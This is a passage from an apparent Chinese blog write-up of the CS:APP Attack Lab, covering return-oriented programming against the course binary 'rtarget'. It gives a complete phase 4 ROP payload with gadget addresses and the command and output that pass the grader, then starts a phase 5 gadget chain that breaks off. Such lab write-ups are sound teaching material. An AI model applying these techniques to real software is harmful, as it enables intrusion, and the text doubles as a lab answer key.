<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">    printf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">No exploit. Getbuf returned 0x</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">%x\n</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> val</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-c line-numbers-mode" data-highlighter="shiki" data-ext="c" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-c"><span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">void</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> touch2</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">unsigned</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;"> val</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">{</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    vlevel </span><span style="--shiki-light:#999999;--shiki-dark:#666666;">=</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 2</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;"> /* Part of validation protocol */</span></span>
<span class="line"><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">    if</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> (</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">val </span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">==</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> cookie</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> {</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">        printf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">Touch2!: You called touch2(0x</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">%.8x</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">)</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">\n</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> val</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">        validate</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">2</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">    }</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;"> else</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> {</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">        printf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">Misfire: You called touch2(0x</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">%.8x</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">)</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">\n</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> val</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">        fail</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">2</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">    }</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">    exit</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">0</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>我们需要构造一个输入，使得 <code>getbuf</code> 函数返回后，程序的控制流跳转到 <code>touch2</code> 函数。但由于栈随机化，我们需要利用 ROP 技术，通过一系列的 gadgets 来实现对 <code>touch2</code> 函数的调用。</p><p>具体来说，我们需要找到合适的 gadgets 来构造 ROP 链，首先是将 cookie 的值加载到寄存器中，然后调用 <code>touch2</code> 函数。将值加载到寄存器中可以通过 <code>popq</code> 指令实现，这样我们只需要将 cookie 的值放到栈上即可。</p><p>清楚我们需要什么指令后，从 gadgets 库中寻找合适的 gadgets 组成 ROP 链：</p><div class="language-asm line-numbers-mode" data-highlighter="shiki" data-ext="asm" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-asm"><span class="line"><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">; Gadget 1</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">401e9c</span><span style="--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic;">:</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 58</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> c3 2c    popq %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rax</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">                    ret</span></span>
<span class="line"><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">; Gadget 2</span></span>
<span class="line"><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">401e87</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">: </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">89</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> c7 c3    movl %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">eax</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">, %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">edi</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">                    ret</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>结合上述两个 gadgets，添加 <code>touch2</code> 函数地址和 cookie 的值组成攻击载荷：</p><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-text"><span class="line"><span>/* phase4.txt */</span></span>
<span class="line"><span>00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>9c 1e 40 00 00 00 00 00 /* Gadget 1 */</span></span>
<span class="line"><span>66 ce c8 24 00 00 00 00 /* cookie value */</span></span>
<span class="line"><span>87 1e 40 00 00 00 00 00 /* Gadget 2 */</span></span>
<span class="line"><span>f5 1b 40 00 00 00 00 00 /* Address of touch2 function */</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>转换为原始字节序列并传递给 <code>rtarget</code> 程序：</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">cat</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> phase4.txt</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> |</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> ./hex2raw</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> |</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> ./rtarget</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-text"><span class="line"><span>Cookie: 0x24c8ce66</span></span>
<span class="line"><span>Type string:Touch2!: You called touch2(0x24c8ce66)</span></span>
<span class="line"><span>Valid solution for level 2 with target rtarget</span></span>
<span class="line"><span>PASS: Sent exploit string to server to be validated.</span></span>
<span class="line"><span>NICE JOB!</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="phase-5" tabindex="-1"><a class="header-anchor" href="#phase-5"><span>Phase 5</span></a></h2><p>在 phase 4 中，我们需要针对 <code>rtarget</code> 程序实现 ROP 攻击。</p><div class="language-c line-numbers-mode" data-highlighter="shiki" data-ext="c" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-c"><span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">void</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> test</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">()</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">{</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">    int</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> val</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    val </span><span style="--shiki-light:#999999;--shiki-dark:#666666;">=</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> getbuf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">();</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">    printf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">No exploit. Getbuf returned 0x</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">%x\n</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> val</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-c line-numbers-mode" data-highlighter="shiki" data-ext="c" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-c"><span class="line"><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">/* Compare string to hex represention of unsigned value */</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">int</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> hexmatch</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">unsigned</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;"> val</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> char</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> *</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">sval</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">{</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">    char</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;"> cbuf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">[</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">110</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">];</span></span>
<span class="line"><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">    /* Make position of check string unpredictable */</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">    char</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> *</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">s </span><span style="--shiki-light:#999999;--shiki-dark:#666666;">=</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> cbuf </span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">+</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> random</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">()</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> %</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 100</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">    sprintf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">s</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;"> &quot;</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">%.8x</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> val</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">    return</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> strncmp</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">sval</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> s</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 9</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> ==</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 0</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">}</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">void</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> touch3</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">char</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> *</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">sval</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">{</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    vlevel </span><span style="--shiki-light:#999999;--shiki-dark:#666666;">=</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 3</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;"> /* Part of validation protocol */</span></span>
<span class="line"><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">    if</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> (</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">hexmatch</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">cookie</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> sval</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">))</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> {</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">        printf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">Touch3!: You called touch3(</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">\&quot;%s\&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">)</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">\n</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> sval</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">        validate</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">3</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">    }</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;"> else</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> {</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">        printf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">Misfire: You called touch3(</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">\&quot;%s\&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">)</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">\n</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> sval</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">        fail</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">3</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">    }</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">    exit</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">0</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>我们需要构造一个输入，使得 <code>getbuf</code> 函数返回后，调用 <code>touch3</code> 函数。但由于栈随机化，我们需要利用 ROP 技术，通过一系列的 gadgets 来实现对 <code>touch3</code> 函数的调用。</p><p>首先，需要将 cookie 字符串储存在内存空间中，由于 cookie 信息只能由我们的攻击载荷带入，所以 cookie 只能储存在栈空间中。但是，由于栈随机化保护，我们无法直接 cookie 字符串的确切地址。一个容易想到的方法是采用相对地址，虽然栈地址是随机的，但是 cookie 字符串相对于栈顶的偏移量是固定的，因此，我们可以通过获取当前 %rsp 的值再加上偏移量来获取 cookie 字符串的地址。</p><p>有了这个基本思路我们接下来就需要去寻找合适的 gadgets 来实现这个思路，这个过程比较曲折，因为提供的 gadgets 库中有时可能并没有直接对应的指令，我们需要通过组合多个 gadgets 来实现我们想要的功能。</p><div class="language-asm line-numbers-mode" data-highlighter="shiki" data-ext="asm" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-asm"><span class="line"><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">; Gadget 1</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">401f2f</span><span style="--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic;">:</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 48</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 89</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> e0 c3     </span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">movq</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rsp</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">, %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rax</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">                        ret</span></span>
<span class="line"><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">; Gadget 2</span></span>
<span class="line"><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">401e90</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">: </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">48</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 89</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> c7 </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">90</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> c3  </span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">movq</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rax</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">, %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rdi</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">                        nop</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">                        ret</span></span>
<span class="line"><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">; Gadget 3</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">401ea6</span><span style="--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic;">:</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 58</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> c3           popq %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rax</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">                        ret</span></span>
<span class="line"><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">; Gadget 4</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">401f83</span><span style="--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic;">:</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 89</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> c1 </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">38</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> c9 c3  movl %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">eax</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">, %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">ecx</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">                        cmpb %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">cl</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">, %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">cl</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">                        ret</span></span>
<span class="line"><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">; Gadget 5</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">401f8e</span><span style="--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic;">:</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 89</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> ca </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">90</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 90</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> c3  movl %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">ecx</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">, %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">edx</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">                        nop</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">                        nop</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">                        ret</span></span>
<span class="line"><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">; Gadget 6</span></span>
